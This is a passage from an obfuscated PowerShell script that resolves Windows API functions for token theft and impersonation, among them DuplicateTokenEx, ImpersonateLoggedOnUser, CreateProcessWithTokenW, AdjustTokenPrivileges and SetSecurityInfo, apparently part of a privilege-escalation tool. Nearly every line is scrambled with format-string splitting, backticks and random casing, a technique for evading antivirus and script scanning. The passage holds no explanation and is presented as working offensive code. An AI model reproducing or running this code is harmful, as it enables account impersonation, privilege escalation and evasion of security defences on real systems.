    ${TyP`EB`UIL`der} = ${m`O`dUL`EBUi`LDEr}.("{2}{1}{0}"-f'eType','in','Def').Invoke(("{3}{2}{0}{4}{1}"-f 'IC','T_ACCESS','PL','EX','I'), ${AttRib`ut`ES}, [System.ValueType])
    ${TyPEb`uiL`DeR}.("{0}{3}{2}{1}" -f 'De','eld','neFi','fi').Invoke(("{1}{4}{3}{0}{2}"-f'ermissi','gr','ons','essP','fAcc'), [UInt32], ("{0}{1}"-f'Pub','lic')) | &("{1}{2}{0}" -f'ull','Out','-N')
    ${T`Yp`eb`uilDer}.("{0}{1}{2}" -f 'De','fine','Field').Invoke(("{3}{0}{2}{1}" -f 'fA','essMode','cc','gr'), [UInt32], ("{0}{1}" -f'Pu','blic')) | &("{0}{1}" -f'Out-Nu','ll')
    ${T`YPeB`ui`LDEr}.("{1}{3}{0}{2}" -f 'iel','Defin','d','eF').Invoke(("{1}{0}{2}" -f'tanc','grfInheri','e'), [UInt32], ("{0}{1}"-f'Publi','c')) | &("{0}{1}{2}" -f'Ou','t-Nul','l')
    ${typebu`il`D`eR}.("{1}{0}{2}" -f'efineFiel','D','d').Invoke(("{2}{0}{1}"-f't','ee','Trus'), ${t`RUsTEE}, ("{0}{1}" -f 'Pub','lic')) | &("{2}{0}{1}"-f'l','l','Out-Nu')
    ${eXpLic`It_`AcC`eSs} = ${typE`B`UI`LDEr}.("{2}{1}{0}"-f'eType','reat','C').Invoke()
    


    
    
    
    ${OPeNprocES`s`Ad`dr} = &("{1}{0}{2}"-f't','Ge','-ProcAddress') ("{0}{3}{1}{2}" -f'k','32.dl','l','ernel') ("{2}{0}{3}{1}" -f 'enPro','s','Op','ces')
	${openP`RO`ce`SS`dELEgatE} = &("{0}{3}{2}{1}"-f'Get','ype','teT','-Delega') @([UInt32], [Bool], [UInt32]) ([IntPtr])
	${OP`e`NPrO`CeSS} =   $310wC::("{7}{1}{0}{6}{4}{3}{5}{2}" -f 'ele','tD','onPointer','nc','orFu','ti','gateF','Ge').Invoke(${o`pE`NProCEss`Addr}, ${Openpro`c`EssdEleg`ATE})

    ${OpE`NPRO`ce`S`St`okenadDR} = &("{2}{3}{1}{0}" -f'ddress','ProcA','G','et-') ("{3}{1}{0}{2}"-f 'va','d','pi32.dll','a') ("{2}{1}{3}{4}{0}" -f 'n','oce','OpenPr','ssTok','e')
	${oPEn`PR`oCess`TokeND`ELegATe} = &("{4}{2}{3}{0}{1}"-f'-DelegateTyp','e','e','t','G') @([IntPtr], [UInt32],   (  &('LS') ("{1}{4}{3}{0}{2}" -f'g4Tv','vaRi','z','0','ABlE:')).vaLUe.("{1}{3}{0}{2}"-f'Re','M','fType','akeBy').Invoke()) ([Bool])
	${op`e`NPRo`c`essToKEn} =   $310wc::("{3}{1}{2}{6}{5}{4}{0}"-f'ter','legate','For','GetDe','oin','unctionP','F').Invoke(${oPENProCe`sS`Toke`NADdr}, ${O`PenPROCEsStOKenDeL`E`g`Ate})    

    ${get`ToKeNiN`Fo`RMaTiON`A`d`Dr} = &("{1}{0}{3}{2}" -f 'ocA','Get-Pr','ss','ddre') ("{0}{2}{1}"-f 'advapi3','.dll','2') ("{1}{2}{0}{3}" -f 'o','GetTokenInfor','mati','n')
	${gEtt`oKEN`Info`RmAt`IonD`e`leGA`Te} = &("{3}{1}{0}{4}{2}" -f'gateTy','et-Dele','e','G','p') @([IntPtr], ${toKE`N_`InFoR`mATi`On_c`L`AsS}, [IntPtr], [UInt32],  (&("{1}{2}{0}" -f'RIAbLe','gE','T-va')  ("{1}{0}"-f'Z','dgv') ).ValuE.("{0}{2}{3}{1}"-f'M','efType','akeBy','R').Invoke()) ([Bool])
	${g`e`T`T`okeNinf`orM`ATion} =   (&("{1}{0}" -f'T-iTEm','gE')  ("{0}{1}{2}{3}{4}"-f'V','AR','I','AbLE:31','0wc') ).VALuE::("{5}{1}{0}{3}{4}{6}{7}{2}"-f'gate','e','nter','ForFu','nc','GetDel','ti','onPoi').Invoke(${GETToke`Ni`NFOr`m`AtionaDDR}, ${GETToK`eNiNFo`Rmat`iONd`eLeGA`TE})    

    ${s`eTTHrEaD`TOkEnA`ddr} = &("{2}{3}{1}{0}"-f'ss','rocAddre','Get-','P') ("{1}{3}{0}{2}" -f '32.d','advap','ll','i') ("{0}{1}{2}{3}"-f 'SetThre','a','dToke','n')
	${sEttHr`eA`dTOke`NDe`l`e`GatE} = &("{4}{3}{1}{2}{0}"-f'Type','at','e','et-Deleg','G') @([IntPtr], [IntPtr]) ([Bool])
	${se`TthRead`T`ok`En} =   $310WC::("{5}{4}{2}{0}{3}{1}{6}"-f'ForF','tionPo','ate','unc','eg','GetDel','inter').Invoke(${SETt`hrEA`DTOk`ENaDdr}, ${Se`T`ThRea`dTO`K`END`EleGATe})    

    ${I`MPEr`sON`Ate`loggEdoNUs`er`AdDR} = &("{0}{1}{2}"-f'Get-Pr','ocAddres','s') ("{0}{2}{1}" -f'ad','2.dll','vapi3') ("{1}{3}{0}{5}{4}{2}"-f 'ona','Impe','OnUser','rs','ogged','teL')
	${imPerSOnAT`elOG`GE`dOnus`Erdele`g`AtE} = &("{2}{1}{0}{3}" -f 'egateT','-Del','Get','ype') @([IntPtr]) ([Bool])
	${ImpeRso`NAT`el`ogGeDONUS`eR} =   ( &("{1}{0}" -f 'dItEm','CHil')  ('vArI'+'A'+'B'+'lE:310wC')).VALuE::("{2}{0}{7}{5}{1}{4}{6}{3}"-f 'e','ForFunc','GetDel','r','tionPo','e','inte','gat').Invoke(${impER`S`O`NAteL`OG`ged`onU`SER`ADdr}, ${IMPerSo`NaTElOg`GE`dON`uSe`RDeLegAtE})

    ${re`VerT`T`OsELFa`D`DR} = &("{2}{0}{1}" -f 'ocAdd','ress','Get-Pr') ("{2}{1}{3}{0}"-f'l','pi3','adva','2.dl') ("{1}{0}{2}" -f 'ToSel','Revert','f')
	${Re`VER`T`ToSeLfDELEg`ATE} = &("{0}{1}{3}{2}"-f 'Get-','DelegateTy','e','p') @() ([Bool])
	${r`eVe`RT`ToSELF} =  (&("{1}{0}" -f'HIlDIteM','C') ("{1}{4}{0}{2}{3}"-f 'a','VAr','BLe:3','10wC','I')).vALuE::("{5}{6}{4}{0}{2}{3}{1}" -f'nc','inter','tio','nPo','u','GetDelegateFo','rF').Invoke(${Re`VEr`TTOS`elF`AdDR}, ${ReVer`Tt`OsELFdE`leGATe})

    ${L`sAGE`Tlogo`N`SESSIonDaTAaddr} = &("{1}{3}{4}{2}{0}" -f's','G','Addres','et-','Proc') ("{1}{0}{2}" -f '2.dl','secur3','l') ("{0}{3}{6}{5}{1}{4}{2}"-f'LsaGetL','onD','a','ogon','at','i','Sess')
	${ls`Age`TLO`g`ONSe`SSIondatadele`gaTE} = &("{0}{4}{2}{3}{1}"-f'G','egateType','-','Del','et') @([IntPtr],   (  &("{0}{1}" -f 'It','EM') ("{0}{1}{2}{3}" -f 'va','rI','abLe:0G','4tvz')).vALuE.("{3}{2}{4}{0}{1}" -f'fTy','pe','eByR','Mak','e').Invoke()) ([UInt32])
	${lsAGET`LogOn`sEs`SI`On`dATA} =   (  &("{1}{0}{2}{3}"-f 'I','CHilD','T','em')  ("{1}{2}{0}"-f ':310wc','vA','RIABle')).value::("{5}{3}{6}{4}{2}{1}{0}" -f 'ionPointer','nct','rFu','ga','Fo','GetDele','te').Invoke(${LsAGeTLogo`Ns`e`s`s`iondAT`AADdR}, ${lsAg`etL`ogOn`S`EssiOndATA`deLEGa`Te})

    ${c`R`Ea`TEPrOC`EssWithToKE`NWaDdR} = &("{3}{2}{0}{1}" -f'dr','ess','-ProcAd','Get') ("{0}{2}{1}"-f'advap','dll','i32.') ("{3}{0}{4}{2}{1}"-f 'rocessWi','nW','oke','CreateP','thT')
	${c`Re`ATEPRo`CES`SwiThT`OkenwdelEgAtE} = &("{3}{4}{0}{1}{2}" -f 'e','T','ype','G','et-Delegat') @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
	${CR`Ea`TE`pr`oCEsSW`itht`OkE`NW} =   (  &("{1}{0}"-f'ArIabLe','V') ("3"+"10Wc")  ).VaLUE::("{5}{2}{0}{6}{1}{8}{4}{7}{3}"-f 'u','ctio','F','r','Poi','GetDelegateFor','n','nte','n').Invoke(${creA`T`e`prOCES`SWi`Tht`O`KEnW`ADDR}, ${Cre`AtepRO`cE`sSWitHtO`KeN`WDELE`G`ATe})

    ${mEMsE`TAd`dr} = &("{0}{1}{3}{2}" -f 'Ge','t-ProcAdd','ess','r') ("{0}{1}{2}" -f 'm','svcrt','.dll') ("{0}{1}"-f 'm','emset')
	${Me`MsEtdE`leg`ATe} = &("{3}{4}{0}{2}{1}"-f 'e','teType','lega','Get-','D') @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
	${mEm`SET} =  ( &("{1}{0}{3}{2}"-f'T','Ge','RIabLe','-Va') ('31'+'0wC') -VALUeON  )::("{3}{4}{5}{1}{2}{0}{6}" -f'inte','ction','Po','Get','De','legateForFun','r').Invoke(${mE`mse`Taddr}, ${MeMs`ETDeLe`GatE})

    ${D`up`l`ICa`TetOKenExad`dR} = &("{2}{4}{0}{3}{1}" -f 'rocA','s','Ge','ddres','t-P') ("{3}{1}{0}{2}" -f'vapi32.d','d','ll','a') ("{0}{1}{4}{5}{3}{2}" -f'Du','plica','x','E','teTok','en')
	${DUPli`Cat`EtO`KEneXdelE`g`ATe} = &("{2}{1}{3}{4}{0}" -f 'ype','t-','Ge','Deleg','ateT') @([IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32],   ( &("{2}{1}{0}"-f'ABLe','ARi','V')  ("{0}{2}{1}" -f '0g','VZ','4T') -VA ).("{0}{3}{2}{4}{1}" -f'M','e','yRefTy','akeB','p').Invoke()) ([Bool])
	${dUP`lIcat`e`TokeNEx} =   $310wC::("{1}{5}{8}{2}{6}{0}{4}{7}{3}"-f'ction','Ge','e','er','Po','t','gateForFun','int','Del').Invoke(${DupLIC`A`TE`T`oke`NEXaDdR}, ${D`U`pLICAte`ToKEn`ExDElEGA`Te})

    ${l`OOk`UPaCcOuNTsI`dwad`dR} = &("{3}{2}{1}{0}{4}"-f'r','dd','cA','Get-Pro','ess') ("{2}{0}{1}"-f '32.dl','l','advapi') ("{0}{3}{2}{1}"-f 'LookupAcco','W','d','untSi')
	${l`ooKUpACc`OuntSId`w`d`eLegATE} = &("{3}{1}{2}{4}{0}" -f'e','et','-Del','G','egateTyp') @([IntPtr], [IntPtr], [IntPtr],   ( &("{0}{1}"-f'v','aRIaBLe')  ("{0}{1}" -f'DgV','z')).vALUe.("{1}{2}{3}{0}" -f'e','MakeByR','ef','Typ').Invoke(), [IntPtr],   (  &('gi') ("{2}{0}{3}{4}{1}"-f'r','Z','VA','Iable',':dgv') ).vALue.("{1}{4}{0}{2}{3}"-f'ke','M','ByRefTyp','e','a').Invoke(),  $dGvZ.("{1}{2}{0}"-f 'pe','Ma','keByRefTy').Invoke()) ([Bool])
	${Lo`Oku`PacCOu`NTs`idw} =   $310Wc::("{4}{6}{1}{2}{3}{0}{5}" -f 'oi','elegat','eForFuncti','onP','Get','nter','D').Invoke(${L`OOKUp`ACCOUNTSidw`AD`dr}, ${l`ooKupacCoU`NTsIDwD`E`L`EG`A`Te})

    ${ClO`s`EH`AnDl`eAdDR} = &("{2}{1}{0}" -f'dress','ProcAd','Get-') ("{3}{1}{2}{0}"-f'.dll','ern','el32','k') ("{0}{3}{2}{1}"-f 'C','Handle','e','los')
	${c`LosehAnDlED`EleG`AtE} = &("{0}{2}{4}{3}{5}{1}" -f 'Get','pe','-Del','eT','egat','y') @([IntPtr]) ([Bool])
	${CLOsE`HA`NDLE} =  ( &("{1}{0}"-f'IaBlE','var') ('31'+'0Wc')  ).value::("{4}{1}{2}{6}{7}{3}{5}{0}" -f 'er','e','legateF','nPoin','GetD','t','or','Functio').Invoke(${c`LoseH`AnD`L`eaDDR}, ${CLO`S`EhAN`dLeD`E`LEgaTe})

    ${L`S`AFreErEtU`R`Nb`UfFE`Ra`DDR} = &("{0}{3}{2}{1}{4}"-f'Get','dr','Ad','-Proc','ess') ("{2}{1}{0}"-f '32.dll','ecur','s') ("{0}{4}{1}{2}{3}{5}"-f'LsaF','Retu','rn','Bu','ree','ffer')
	${LSaFreeReT`ur`NbuF`FE`RDE`Leg`ATe} = &("{2}{0}{3}{1}" -f 'et-Delegat','ype','G','eT') @([IntPtr]) ([UInt32])
	${LsAfr`eeR`ETur`Nb`Uf`FeR} =  (&("{1}{3}{2}{0}" -f 'BLE','get','Ia','-vAR')  ("31"+"0wc") ).VAlUe::("{6}{1}{5}{3}{4}{0}{2}"-f 't','et','er','elegateForFu','nctionPoin','D','G').Invoke(${lsaF`R`eerEtUrNB`UfFeRa`DDR}, ${l`SA`FrEeREtuRN`BU`F`Fer`dEle`GA`Te})

    ${OP`en`THR`ea`dAddr} = &("{0}{4}{1}{2}{3}"-f'Get-Pr','c','Addr','ess','o') ("{1}{0}{2}" -f 'el3','kern','2.dll') ("{0}{1}{2}" -f 'OpenT','hre','ad')
	${opEntHREad`dE`lE`GaTE} = &("{0}{2}{3}{1}"-f'Get-De','ype','l','egateT') @([UInt32], [Bool], [UInt32]) ([IntPtr])
	${Op`E`NthRe`Ad} =  (&("{0}{1}" -f 'VaRi','abLe')  ("{0}{1}" -f '3','10wC') -valu  )::("{4}{3}{1}{2}{5}{0}"-f 'nPointer','teFor','Fun','tDelega','Ge','ctio').Invoke(${O`PentH`RE`ADaddR}, ${OP`E`N`THREAddELe`g`AtE})

    ${op`E`N`T`HreADTOk`EN`ADDR} = &("{0}{2}{1}{4}{3}"-f'Ge','-Proc','t','dress','Ad') ("{1}{0}{2}"-f '.','advapi32','dll') ("{3}{0}{2}{1}" -f'read','n','Toke','OpenTh')
	${oPE`Nthre`Adt`oK`EnDEleGa`TE} = &("{0}{1}{2}{3}{4}"-f 'Get-De','le','gat','eTy','pe') @([IntPtr], [UInt32], [Bool],   (&('Gi')  ("{0}{1}{4}{2}{3}"-f'V','a','aBLe:0G4T','vZ','rI')  ).vAlUE.("{1}{2}{0}{4}{3}"-f'ByRef','Ma','ke','ype','T').Invoke()) ([Bool])
	${o`PEnTHrEaDT`ok`En} =   $310Wc::("{6}{5}{4}{2}{3}{1}{0}" -f'ionPointer','unct','teF','orF','ga','Dele','Get').Invoke(${o`peNthrEA`DTo`Ke`N`ADDR}, ${oPeNthReAdToKEnd`E`L`e`G`ATE})

    ${cReaTEPROc`eS`SaSuSe`RwA`ddr} = &("{0}{2}{4}{3}{1}"-f'Ge','s','t-Pro','s','cAddre') ("{0}{1}{2}{3}" -f'a','dvapi3','2.d','ll') ("{1}{4}{3}{2}{0}{5}" -f 'er','Cr','eProcessAsUs','at','e','W')
	${creATePrO`cE`Ssa`S`USe`R`wDe`L`EgAtE} = &("{1}{0}{2}{4}{3}" -f 'et-De','G','leg','Type','ate') @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([Bool])
	${C`RE`AtE`Pr`OcEsSaSusERW} =  $310WC::("{8}{2}{3}{7}{5}{0}{1}{6}{4}" -f'nPoi','nt','tDelegate','Fo','r','unctio','e','rF','Ge').Invoke(${crE`AtEP`ROCe`S`SAsuSE`R`WA`ddr}, ${CreaTe`PRO`C`eSsAS`UsE`R`wdEleg`AtE})

    ${Open`wIND`oWsT`AtiO`NW`A`Ddr} = &("{3}{4}{2}{1}{0}"-f 'dress','ocAd','Pr','G','et-') ("{0}{2}{1}"-f'user3','dll','2.') ("{1}{0}{4}{2}{3}{5}" -f 'W','Open','ti','on','indowSta','W')
    ${o`P`En`Wi`NDoWsTati`On`wD`ELe`GatE} = &("{1}{0}{2}"-f'DelegateTyp','Get-','e') @([IntPtr], [Bool], [UInt32]) ([IntPtr])
    ${op`ENWINDow`STA`T`i`OnW} =   $310wC::("{6}{0}{4}{5}{3}{1}{2}"-f'eg','ti','onPointer','ForFunc','a','te','GetDel').Invoke(${opEnW`INd`oW`sTa`TIONwaDdr}, ${O`P`e`Nwi`NDO`WSTATIOnWDEleGa`Te})

    ${OP`en`d`eSK`TopAA`DDr} = &("{2}{1}{0}{3}" -f 'ddres','A','Get-Proc','s') ("{0}{2}{1}"-f'user','ll','32.d') ("{0}{2}{3}{1}" -f'O','nDesktopA','p','e')
    ${O`p`e`NDEsktop`AdElEGa`Te} = &("{0}{2}{1}{3}" -f 'Get-Deleg','eT','at','ype') @([String], [UInt32], [Bool], [UInt32]) ([IntPtr])
    ${o`PEn`dE`sktOPA} =  $310wc::("{5}{6}{1}{4}{0}{3}{7}{2}{8}" -f'ti','F','t','onPo','orFunc','GetDelegat','e','in','er').Invoke(${o`p`EN`DesktopAAddR}, ${Op`e`ND`EsktoPa`De`lE`gaTE})

    ${imPe`R`SONa`TeSE`lfAddR} = &("{2}{0}{1}"-f'Add','ress','Get-Proc') ("{0}{1}{2}{3}" -f 'Adv','api3','2.','dll') ("{2}{3}{0}{1}"-f 'eSel','f','I','mpersonat')
    ${IMPeRsOn`A`TE`sel`Fd`E`L`egaTE} = &("{3}{1}{0}{2}"-f'Dele','-','gateType','Get') @([Int32]) ([Bool])
    ${imPe`RsoNATes`e`Lf} =   (  &("{0}{2}{1}"-f 'v','E','ARIAbL') ('310w'+'c')).vAlUE::("{2}{6}{5}{4}{7}{3}{1}{0}" -f 'er','int','Get','tionPo','le','e','D','gateForFunc').Invoke(${ImpE`RSonaTeSe`LFaD`dr}, ${iM`PErSo`N`AteSELf`DeLeGA`TE})

    ${LoOk`u`PPR`IVilEgeVa`l`UEaDDr} = &("{2}{0}{1}"-f 'dres','s','Get-ProcAd') ("{0}{1}{2}"-f'Ad','v','api32.dll') ("{4}{1}{0}{5}{3}{2}" -f 'Priv','ookup','alueA','V','L','ilege')
    ${L`oOK`uP`P`RIvi`LEgEvA`L`uEdElEG`AtE} = &("{2}{0}{4}{1}{3}" -f 'lega','Typ','Get-De','e','te') @([String], [String], ${l`UId}.("{2}{0}{1}{3}"-f'keBy','RefTy','Ma','pe').Invoke()) ([Bool])
    ${L`o`OK`upPRIViL`EGEvaLUE} =  (&("{3}{0}{1}{2}" -f'-V','A','RIabLE','GEt')  ("{0}{1}"-f '310','Wc')  ).value::("{0}{5}{1}{2}{6}{4}{7}{3}" -f'Get','ega','te','er','Fun','Del','For','ctionPoint').Invoke(${LoOkU`Pp`Ri`V`iLeGeV`ALu`eaDdR}, ${l`oo`KuPprI`VI`leGEvalueDelEGA`TE})

    ${ADjuSTToKen`Pr`iVile`GE`s`ADdR} = &("{3}{1}{2}{4}{0}" -f 'ss','e','t-Pro','G','cAddre') ("{2}{0}{3}{1}"-f'vapi32','dll','Ad','.') ("{5}{2}{0}{3}{1}{4}"-f 'okenPriv','l','stT','i','eges','Adju')
    ${a`dJUstT`ok`EN`pRIViLEGe`sD`e`L`EGA`TE} = &("{0}{1}{3}{2}" -f 'Get-','Deleg','eType','at') @([IntPtr], [Bool], ${tOKe`N_priV`I`lE`G`Es}.("{0}{2}{1}"-f'M','fType','akeByRe').Invoke(), [UInt32], [IntPtr], [IntPtr]) ([Bool])
    ${aDJUs`Tto`kENPr`I`V`ilEGEs} =  $310Wc::("{5}{6}{2}{0}{3}{1}{4}"-f 'nc','oin','Fu','tionP','ter','GetDelegat','eFor').Invoke(${ad`JU`STtoK`eNpriV`IlegE`s`AddR}, ${ad`Ju`SttokENPr`IVIl`ege`sD`ELEg`A`Te})

    ${GetcUrRe`NttH`RE`Ad`AdDR} = &("{1}{0}{2}{3}"-f'e','G','t-P','rocAddress') ("{0}{2}{1}{3}"-f 'k','32.dl','ernel','l') ("{2}{3}{0}{1}" -f 'Th','read','GetC','urrent')
    ${getc`UrRent`T`hR`EAd`DEL`eg`ATE} = &("{2}{1}{0}{3}"-f'ele','t-D','Ge','gateType') @() ([IntPtr])
    ${GE`TC`uRR`EnTth`RE`Ad} =   (&("{0}{2}{1}"-f 'v','aBlE','aRi') ("{0}{1}" -f '31','0WC') ).vAluE::("{2}{3}{0}{1}{5}{6}{4}"-f 'ForFun','ct','GetD','elegate','nter','ionPo','i').Invoke(${g`EtCu`RrEnTTh`RE`Ad`Addr}, ${GETCuRRE`N`T`THrE`A`dDeLEgATE})

    ${G`ET`sEcUrItYInfoA`DdR} = &("{0}{1}{2}"-f 'Get-ProcAd','d','ress') ("{2}{1}{0}"-f'll','vapi32.d','ad') ("{3}{0}{4}{2}{1}" -f'Secu','nfo','ityI','Get','r')
    ${ge`T`SE`CURitYi`NFOd`elegAtE} = &("{3}{1}{2}{0}"-f'egateType','et-','Del','G') @([IntPtr], [UInt32], [UInt32],  (&('gi')  ("{0}{1}{3}{2}" -f'VARiabL','e:0G','tVz','4')).VaLUE.("{2}{3}{1}{0}" -f'Type','ByRef','Ma','ke').Invoke(),  $0g4tvz.("{4}{0}{1}{3}{2}"-f 'eByR','e','ype','fT','Mak').Invoke(),   (&("{1}{2}{0}" -f 'BlE','vArI','A')  ("0"+"G4tv"+"z") -VA ).("{2}{3}{1}{0}" -f 'pe','RefTy','Ma','keBy').Invoke(),   (  &("{0}{1}" -f'Di','R')  ("{0}{1}{4}{2}{3}"-f 'vArIAB','lE','0','G4TVz',':') ).vALUe.("{2}{3}{1}{0}" -f'RefType','y','Make','B').Invoke(),  (  &("{1}{0}{2}" -f'ab','VAri','Le') ("0"+"G4TVZ")).VAlUe.("{0}{2}{1}" -f 'MakeB','e','yRefTyp').Invoke()) ([UInt32])
    ${GEtSe`c`u`RITy`infO} =   $310WC::("{3}{1}{0}{4}{2}" -f 'teF','ga','nctionPointer','GetDele','orFu').Invoke(${GeT`Se`CuRiTyi`Nf`oAddr}, ${g`ET`secUrI`TyInf`O`dELEgatE})

    ${sET`sECuR`ITy`INfoAD`Dr} = &("{4}{3}{1}{2}{0}"-f 'dress','r','ocAd','-P','Get') ("{1}{0}{2}"-f'va','ad','pi32.dll') ("{0}{4}{3}{1}{2}" -f 'S','In','fo','ty','etSecuri')
    ${Sets`Ecu`RI`TYi`NfOdEl`eGa`TE} = &("{2}{3}{1}{0}" -f'ype','teT','Get-Dele','ga') @([IntPtr], [UInt32], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([UInt32])
    ${sET`s`ec`u`RITy`INfo} =  (&("{1}{0}{2}{3}"-f 'eT-variAb','g','L','E') ("31"+"0wc")  -VaLUeo  )::("{6}{5}{3}{1}{0}{2}{4}"-f 'o','i','nP','egateForFunct','ointer','etDel','G').Invoke(${Se`TSE`CU`R`ityinfoaDDR}, ${se`T`seC`UrItyInFoDel`EG`ATE})

    ${gEt`Acea`dDr} = &("{2}{0}{1}"-f't-Pr','ocAddress','Ge') ("{1}{2}{0}"-f'.dll','advapi3','2') ("{0}{1}{2}" -f 'Get','A','ce')
    ${GETaC`edeL`eGa`TE} = &("{0}{2}{4}{3}{1}" -f'G','pe','et-De','gateTy','le') @([IntPtr], [UInt32],  ( &("{2}{1}{0}"-f 'eM','Dit','cHiL') ("{4}{3}{2}{0}{1}"-f'V','z','T','ble:0G4','VArIA') ).vALUE.("{0}{1}{3}{2}" -f'MakeBy','Re','e','fTyp').Invoke()) ([IntPtr])
    ${g`ETA`cE} =   (  &("{1}{0}"-f'rIaBLe','Va')  ("{0}{1}" -f'3','10wC')  -vAlueOn  )::("{5}{8}{4}{7}{2}{0}{3}{6}{1}"-f'unct','Pointer','orF','i','leg','Ge','on','ateF','tDe').Invoke(${G`ETaCE`Ad`dr}, ${GET`Ace`DELe`gA`TE})

    ${loO`kUpacC`O`untSi`d`WaD`dr} = &("{1}{0}{3}{2}"-f'et-Pr','G','ss','ocAddre') ("{1}{2}{0}"-f'l','advapi32','.dl') ("{2}{1}{0}{3}"-f 'upAcco','ook','L','untSidW')
    ${lo`oKU`pA`C`COUnTSi`Dw`dEl`EGate} = &("{1}{2}{5}{3}{4}{0}" -f 'egateType','Ge','t','De','l','-') @([IntPtr], [IntPtr], [IntPtr],   ( &("{1}{2}{0}" -f'BLE','Get-VA','Ria') ('d'+'gvz') ).vaLue.("{1}{0}{2}"-f'yRef','MakeB','Type').Invoke(), [IntPtr],   $DGVZ.("{1}{2}{0}"-f 'yRefType','Make','B').Invoke(),   $dgvZ.("{2}{1}{3}{0}"-f 'Type','keBy','Ma','Ref').Invoke()) ([Bool])
    ${LookUPacc`OUn`T`sIdw} =   (  &("{0}{1}{2}"-f'GeT-vARi','abL','E')  ("{1}{0}" -f '10Wc','3')  ).vALue::("{3}{6}{2}{4}{0}{1}{5}"-f 'oin','te','o','Get','nP','r','DelegateForFuncti').Invoke(${LOO`kup`ACc`o`unTsiD`WADdR}, ${Loo`k`Upa`cc`OUntSIdwDelEgAtE})

    ${aDdacCeSsa`L`lO`We`Da`CEad`Dr} = &("{1}{3}{4}{2}{0}"-f'ss','G','cAddre','et','-Pro') ("{0}{2}{1}"-f 'advap','2.dll','i3') ("{3}{4}{6}{1}{5}{0}{2}"-f 'd','ow','Ace','Add','Acc','e','essAll')
    ${aDdACceS`S`AL`loWe`D`ACeD`EleGa`Te} = &("{0}{2}{3}{4}{1}{5}"-f'Get-De','Ty','l','ega','te','pe') @([IntPtr], [UInt32], [UInt32], [IntPtr]) ([Bool])
    ${adda`Cc`ESs`ALL`oWEdAcE} =  (  &("{1}{0}"-f 'r','di') ('vAriAble'+':'+'31'+'0wC') ).vAlUE::("{0}{1}{7}{4}{5}{3}{6}{8}{2}"-f'Get','Del','inter','o','ForFu','ncti','n','egate','Po').Invoke(${addaCCEs`SAL`lO`Wed`ACE`A`ddr}, ${ad`dacCeSS`ALlOwE`daCe`dELeG`A`TE})

    ${cre`ATEWE`lL`k`NO`wNsIdAD`dR} = &("{2}{1}{0}{3}{4}"-f 't-P','e','G','ro','cAddress') ("{2}{1}{0}" -f'.dll','vapi32','ad') ("{0}{4}{2}{3}{1}"-f'C','wnSid','lK','no','reateWel')
    ${c`R`eAT`EwE`LlkNOW`NSiDDEleGAtE} = &("{1}{2}{0}{3}"-f 'eTy','Get-D','elegat','pe') @([UInt32], [IntPtr], [IntPtr],  ( &("{3}{4}{0}{2}{1}"-f 't','m','E','get-ch','iLdi') ('v'+'arIAB'+'LE'+':D'+'gVz')).vAlue.("{4}{1}{2}{3}{0}" -f 'ype','keBy','Ref','T','Ma').Invoke()) ([Bool])
    ${C`REA`Te`WeLlKnOW`NsiD} =   ( &("{1}{0}{2}"-f 'RIaBL','VA','E') ("{1}{0}" -f'wc','310') -valu  )::("{4}{0}{5}{3}{2}{1}" -f 'elegat','ter','unctionPoin','orF','GetD','eF').Invoke(${CREatE`weLlkNo`w`Ns`IDa`DDr}, ${C`R`eATEWe`LL`KnOw`NSI`ddEL`egatE})

    ${sE`Tent`Ri`EsI`Naclw`AdDR} = &("{2}{0}{3}{1}"-f'c','ress','Get-Pro','Add') ("{2}{1}{0}" -f'll','i32.d','advap') ("{3}{0}{4}{2}{1}"-f 'tEn','InAclW','ies','Se','tr')
    ${s`e`TEN`TRiESInacLWDeL`E`Ga`Te} = &("{2}{1}{0}{3}"-f'egateTyp','t-Del','Ge','e') @([UInt32], ${eXP`LIci`T_ACC`Ess}.("{2}{1}{0}{3}" -f'p','eByRefTy','Mak','e').Invoke(), [IntPtr],   (&("{3}{2}{1}{0}" -f'rIABLE','vA','-','geT')  ("{1}{2}{0}" -f 'Z','0g4t','V') -VAlUE).("{1}{0}{2}" -f 'yRefT','MakeB','ype').Invoke()) ([UInt32])
    ${s`EtE`NtriE`SIna`cLw} =   (&("{1}{0}{2}" -f 'abL','get-Vari','e') ("{0}{1}" -f '31','0WC')).vaLUe::("{4}{1}{7}{2}{3}{5}{6}{8}{0}" -f 'r','l','gateFor','Fu','GetDe','nc','tio','e','nPointe').Invoke(${SeT`EN`TR`Ie`sIn`AClWADdR}, ${S`EtEnTrI`es`iNAClWd`E`L`egAte})

    ${Lo`c`Alf`ReeaDDr} = &("{1}{0}{4}{2}{3}" -f 't-','Ge','rocAddres','s','P') ("{0}{3}{1}{2}" -f'ke','dl','l','rnel32.') ("{0}{2}{1}"-f'Local','e','Fre')
    ${lOCA`LfrEe`DelEGA`Te} = &("{1}{2}{0}" -f'Type','Get-Deleg','ate') @([IntPtr]) ([IntPtr])
    ${lOCA`lf`REe} =   ( &("{0}{1}"-f 'va','riaBlE') ("310w"+"C") -Va)::("{1}{7}{4}{2}{6}{5}{0}{3}" -f 'in','GetD','o','ter','uncti','o','nP','elegateForF').Invoke(${lo`CALF`REE`A`dDR}, ${l`oCa`lFR`EE`dele`GATe})

    ${l`ooK`U`ppRI`VI`legEn`AMEWaDDR} = &("{2}{3}{1}{0}" -f 'dress','ocAd','Ge','t-Pr') ("{1}{3}{2}{0}"-f '.dll','a','i32','dvap') ("{4}{2}{5}{3}{0}{1}"-f 'ame','W','rivi','eN','LookupP','leg')
    ${LoOKUpPR`i`V`ILe`Ge`N`AMEWDeLEGATE} = &("{0}{4}{2}{3}{1}"-f 'Get','eType','Del','egat','-') @([IntPtr], [IntPtr], [IntPtr],  ( &("{0}{1}{2}" -f'V','arIabL','E') ("Dgv"+"z") -vAlU  ).("{1}{3}{2}{0}" -f'ype','M','T','akeByRef').Invoke()) ([Bool])
